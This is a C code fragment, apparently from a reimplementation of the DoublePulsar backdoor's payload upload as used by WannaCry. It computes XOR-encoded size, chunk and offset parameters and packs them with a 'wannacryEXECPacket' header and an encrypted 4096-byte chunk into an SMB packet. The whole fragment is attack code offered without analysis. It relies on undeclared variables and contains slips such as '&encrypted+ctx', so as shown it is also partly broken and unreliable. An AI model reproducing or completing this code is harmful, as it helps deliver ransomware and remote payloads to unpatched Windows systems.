#define byteswap32(value)		\
((((value) & 0xFF000000) >> 24) | (((value) & 0x00FF0000) >> 8) | (((value) & 0xFF00) << 8) | (((value) & 0xFF) << 24))


void DoublePulsar_Session_Setup_Parameter_Generator()
{
unsigned int TotalSizeofPayload = DLL + Shellcode + EXE_BUFFER_LEN;
unsigned int XorKey = 0x58581162;
unsigned int ChunkSize;
unsigned int OffsetofChunkinPayload;

TotalSizeofPayload = 0x507308 ^ XorKey;
ChunkSize = 0x1000 ^ XorKey;
OffsetofChunkinPayload = 0x1000 ^ XorKey;

unsigned int swapped_TotalSizeofPayload = byteswap32(TotalSizeofPayload);
unsigned int swapped_ChunkSize = byteswap32(ChunkSize);
unsigned int swapped_OffsetofChunkinPayload = byteswap32(OffsetofChunkinPayload);

char swapped_TotalSizeofPayload_PARAMETERS[5];
char swapped_ChunkSize_PARAMETERS[5];
char swapped_OffsetofChunkinPayload_PARAMETERS[5];

memcpy((char*)&swapped_TotalSizeofPayload_PARAMETERS, (char*)&swapped_TotalSizeofPayload, 4);
memcpy((char*)&swapped_ChunkSize_PARAMETERS, (char*)&swapped_ChunkSize, 4);
memcpy((char*)&swapped_OffsetofChunkinPayload_PARAMETERS, (char*)&OffsetofChunkinPayload, 4);

unsigned char SESSION_SETUP_PARAMETERS[12];
SESSION_SETUP_PARAMETERS[0] = swapped_TotalSizeofPayload_PARAMETERS[0];
SESSION_SETUP_PARAMETERS[1] = swapped_TotalSizeofPayload_PARAMETERS[1];
SESSION_SETUP_PARAMETERS[2] = swapped_TotalSizeofPayload_PARAMETERS[2];
SESSION_SETUP_PARAMETERS[3] = swapped_TotalSizeofPayload_PARAMETERS[3];
SESSION_SETUP_PARAMETERS[4] = swapped_ChunkSize_PARAMETERS[0];
SESSION_SETUP_PARAMETERS[5] = swapped_ChunkSize_PARAMETERS[1];
SESSION_SETUP_PARAMETERS[6] = swapped_ChunkSize_PARAMETERS[2];
SESSION_SETUP_PARAMETERS[7] = swapped_ChunkSize_PARAMETERS[3];
SESSION_SETUP_PARAMETERS[8] = swapped_OffsetofChunkinPayload_PARAMETERS[0];
SESSION_SETUP_PARAMETERS[9] = swapped_OffsetofChunkinPayload_PARAMETERS[1];
SESSION_SETUP_PARAMETERS[10] = swapped_OffsetofChunkinPayload_PARAMETERS[2];
SESSION_SETUP_PARAMETERS[11] = swapped_OffsetofChunkinPayload_PARAMETERS[3];

memcpy((char*)&big_packet, (char*)wannacryEXECPacket, 70);
memcpy((char*)&big_packet + 70, (char*)&SESSION_SETUP_PARAMETERS, 12);
memcpy((char*)&big_packet + 82, (char*)&encrypted+ctx, 4096);
}
